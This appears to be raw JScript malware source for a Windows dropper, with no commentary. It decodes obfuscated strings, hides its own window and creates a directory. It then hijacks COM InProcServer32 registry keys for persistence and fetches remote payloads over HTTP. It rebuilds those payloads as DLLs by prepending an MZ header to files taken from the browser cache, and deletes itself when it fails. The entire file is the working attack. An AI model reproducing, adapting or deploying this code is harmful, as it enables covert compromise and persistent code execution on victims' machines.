////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////
var pa0="klljkdFHSDFG4fgfdlg";
var pa1="k~{wmv%lklm~zkom%Egserbr}tileE.l}qal@seffi|us.abbliqafi}|@dafa.miqr}s}tf.q}|tiu.qrede|fials.vC\\B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa2="qmr~,z%-qvkls~zs%advabiSR\\xs@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa3="qgr~,z%-klm~zkzm%msqft\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa4="qgr~)z%+klm~zkzm%msjmlV\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa5="}zv{,m%-klm~zkhm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzSR\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa6="}zv{)m%+klm~zkhm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzVF\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa7="rgr~sdbedlm~ppzm%samqli\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa8="rgr~sdbsglm~srzm%samlip\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa9="gzv{,jk-klm~zsdm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzCRJ\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
var pa10="gzv{,km-klm~zssm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzRGV\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";

var d1="", f1="", f2="", f3="", f4="", u1="", u2="", u3="", u4="", findout="", fname1="", fname2="";

var wshell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

ISTA();

function ISTA()
{
    try
    {
        window.resizeTo(1,1); 
        window.moveTo(5000,5000);
        MSUB();
        window.close();

    }
    catch(e)
    {
        DIF();
    }
   
};

function MSUB()
{
    var p1=pa1.substring(17);
    var p2=pa2.substring(17);
    var p3=pa3.substring(17);
    var p4=pa4.substring(17);
    var p5=pa5.substring(17);
    var p6=pa6.substring(17);
    var p7=pa7.substring(17);
    var p8=pa8.substring(17);
    var p9=pa9.substring(17);
    var p10=pa10.substring(17);
    d1=EXR(p1);
    f1=EXR(p3);
    f2=EXR(p4);
    u1=EXR(p5);
    u2=EXR(p6);
    f3=EXR(p7);
    f4=EXR(p8);
    u3=EXR(p9);
    u4=EXR(p10);
    MD(d1);
    var osBit=GOB();
    SR(osBit);
    WGF(osBit);
};

function DIF()
{
    var path=WScript.ScriptFullName;
    if(fso.FileExists(path))
        fso.DeleteFile(path);
};

function GOB() 
{
    var x;
    var bit = wshell.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\\PROCESSOR_ARCHITECTURE");
    if (bit == "x86")
        x = 32;
    else
        x = 64;
    return x;
};

function GOV() 
{
   var x = wshell.RegRead("HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\CurrentVersion");
   return x;
};

function SR(p) 
{
    var x = 0;
    if ((p != 32) && (p != 64))
        x = 0;
    else
    {
        var value = "";
        var key = "";
        if(GOV() < 6.0)
            key = "HKCU\\Software\\Classes\\CLSID\\{B196B286-BAB4-101A-B69C-00AA00341D07}\\InProcServer32\\";
        else
        {
            if(p == 32)
                key = "HKCU\\Software\\Classes\\CLSID\\{3BF043EF-A974-49B3-8322-B853CF1E5EC5}\\InProcServer32\\";
            else
                key = "Software\\Classes\\CLSID\\{3BF043EF-A974-49B3-8322-B853CF1E5EC5}\\InProcServer32\\";
        }

        if (p == 32)
            value = SS(d1) + "\\" + SS(f1) + ".";
        else 
            value = SS(d1) + "\\" + SS(f2) + ".";

        if (p == 32)
            wshell.RegWrite(key, value, "REG_EXPAND_SZ");
        else
            WR64(key, value);

        x = 1;
    }

    return x;
};

function WR64(p1,p2)
{
   var HKEY_CURRENT_USER = 0x80000001;
   var HKEY_LOCAL_MACHINE = 0x80000002;

   context = new ActiveXObject("WbemScripting.SWbemNamedValueSet");
   context.Add("__ProviderArchitecture", 64);
   context.Add("__RequiredArchitecture", true);

   locator = new ActiveXObject("Wbemscripting.SWbemLocator");
   wbem = locator.ConnectServer(null ,"root\\default", null, null, null, null, null, context);
   StdRegProv = wbem.Get("StdRegProv");

   method = StdRegProv.Methods_.Item("CreateKey");
   inParameters = method.InParameters.SpawnInstance_();
   inParameters.hDefKey = HKEY_CURRENT_USER;
   inParameters.sSubKeyName = p1;
   outParameters = StdRegProv.ExecMethod_("CreateKey", inParameters, 0, context);

   method = StdRegProv.Methods_.Item("SetExpandedStringValue");
   inParameters = method.InParameters.SpawnInstance_();
   inParameters.hDefKey = HKEY_CURRENT_USER;
   inParameters.sSubKeyName = p1;
   inParameters.sValueName = "";
   inParameters.sValue = p2;
   outParameters = StdRegProv.ExecMethod_("SetExpandedStringValue", inParameters, 0, context);
};

function SS(p)
{
   var x = p.replace(/^\s+|\s+$/gm,'');
   return x;
};

function CXHR() 
{
    var x;
    try 
    {
        x = new ActiveXObject("MSXML2.XMLHTTP.6.0");
    } 
    catch (e) 
    {
        x = new ActiveXObject("MSXML2.SERVERXMLHTTP");
    }
    return x;
};

function SHTTPG(p1) 
{
    var x = 0;
    try
    {
        var xhr = CXHR();
        xhr.open("GET", p1, false);
        xhr.send();

        if (xhr.status == 200) 
        {
            if(xhr.responseText.length < 5000)
                x = 0;
            else
                x = 1;
        }
    }
    catch(e)
    {
        x = 0;
    }

    return x;
};

function FF(PathArray,itr,nextFree, fname)
{
  var x = 0;
  var newitr = nextFree;
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  if(fso.FolderExists(PathArray[itr]))
  {
    fold = fso.GetFolder(PathArray[itr]);
    FileEnum = new Enumerator(fold.files);
    FolderEnum = new Enumerator(fold.SubFolders);
    for(; !FileEnum.atEnd(); FileEnum.moveNext())
    {
      if(FileEnum.item().Name == fname)
      {
        findout=PathArray[itr]+"\\"+fname;
        x = 1;
        break;
      }
    }
    if(x == 0)
    {
        for (; !FolderEnum.atEnd(); FolderEnum.moveNext())
        {
          PathArray[newitr] = FolderEnum.item().Path;
          newitr++;
        }
        if(fso.FolderExists(PathArray[itr+1])) 
          FF(PathArray, itr+1, newitr, fname);
    }
  }
  return x;
};

function CN(p1)
{
  var f = p1.split("/");
  var fl = f.length-1;
  var n = f[fl].split(".");
  var nl = n.length;
  var i=0;
  var x = "";
  while(i<nl-1)
  {
    if(i==nl-2)
      x = n[i]+"[1]."+n[i+1];
    else
      x += ".";
    i++;
  }
  return x;
};

function SBF(p1,p2)
{
    var bytebuffer = [];
    var i = 0, j = 0;

    var fobj=fso.GetFile(p1);
    ts=fobj.OpenAsTextStream(1,-1);

    while(!ts.AtEndOfStream)
        bytebuffer[i++]=ts.Read(1);
    ts.Close();
    fso.DeleteFile(p1);

    f = fso.CreateTextFile(p2, true);
    f.Write("M");
    f.Write("Z");
    f.Close();
    var fobj2 = fso.GetFile(p2);
    ts=fobj2.OpenAsTextStream(8,-1);

    j = 0;
    while(j<bytebuffer.length)
    {
        ts.Write(bytebuffer[j++]);
    }
    ts.Close();
};

function WGF(p) 
{
    var x=0;
    var dllname1="";
    var dllname2="";
    var webpath1="";
    var webpath2="";

    if ((p != 32) && (p != 64))
        x = 0;
    else
    {
        if (p == 32) 
        {
            dllname1 = f1;
            dllname2 = f3;
            webpath1 = SS(u1);
            webpath2 = SS(u3);
            fname1 = CN(SS(u1));
            fname2 = CN(SS(u3));
        } 
        else 
        {
            dllname1 = f2;
            dllname2 = f4;
            webpath1 = SS(u2);
            webpath2 = SS(u4);
            fname1 = CN(SS(u2));
            fname2 = CN(SS(u4));
        }

        var path = wshell.ExpandEnvironmentStrings(d1);
        path = SS(path);

        var dstpath1 = path + "\\" + dllname1;
        
        if(fso.FileExists(dstpath1))
        {
            x = 0;
        }
        else
        {
            for(var i=0; i<3; i++)
            {
                var s = SHTTPG(webpath1);

                if(s==0)
                {
                    continue;
                }
                else
                {
                    MovTo(fname1, dstpath1);
                    x = 1;
                    break;
                }
            }
        }

        var dstpath2 = path + "\\" + dllname2;

        if(fso.FileExists(dstpath2))
        {
            x = 0;
        }
        else
        {
            for(var i=0; i<3; i++)
            {
                var s = SHTTPG(webpath2);

                if(s==0)
                {
                    continue;
                }
                else
                {
                    MovTo(fname2, dstpath2);
                    x = 1;
                    break;
                }
            }
        }
    }

    return x;
};

function MovTo(name, dstpath)
{
    inetcache=new Array();
    cachereg=wshell.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Cache");
    inetcache[0]=wshell.ExpandEnvironmentStrings(cachereg);
    FF(inetcache,0,1, name);

    if(fso.FileExists(findout))
    {
        SBF(findout, dstpath);
    }
}

function MD(p) 
{
    p = wshell.ExpandEnvironmentStrings(p);
    var pathArray = p.split("\\");
    var fullpath = ""; 

    for (var i = 0; i < pathArray.length; i++) 
    {
        if (fullpath == "")
            fullpath = pathArray[i];
        else
            fullpath = fullpath + "\\" + pathArray[i];

        if (!fso.FolderExists(fullpath))
            fso.CreateFolder(fullpath);
    }
};

function EXR(p) 
{
    var c = 0, i = 0, j = 0;
    var x = "";
    var len = p.length;
    var s = new Array();

    for (i = 0; i < len; i++)
        s[i] = p.charCodeAt(i);

    for (i = 0; i < len; i++) 
    {
        c = 0;
        for (j = 128; j > 0; j = j / 2) 
        {
            switch(j)
            {
            case 64 :
                if ((s[i] & j) != 0)
                    c = c | 0x20;
                else
                    c = c & 0xdf;
                break;
            case 32 :
                if ((s[i] & j) != 0)
                    c = c | 0x40;
                else
                    c = c & 0xbf;
                break;
            case 16 :
                if ((s[i] & j) != 0)
                    c = c | 0x02;
                else
                    c = c & 0xfd;
                break;
            case  2 :
                if ((s[i] & j) != 0)
                    c = c | 0x10;
                else
                    c = c & 0xef;
                break;
            case  8 :
                if ((s[i] & j) != 0)
                    c = c | 0x08;
                else
                    c = c & 0xf7;
                break;
            case  4 :
                if ((s[i] & j) != 0)
                    c = c | 0x04;
                else
                    c = c & 0xfb;
                break;
            case  1 :
                if ((s[i] & j) != 0)
                    c = c | 0x01;
                else
                    c = c & 0xfe;
                break;
            }
        }
        s[i] = c;
    }

    for(i = 0; i < len; i++)
        x += String.fromCharCode(s[i]);

    return x;
};

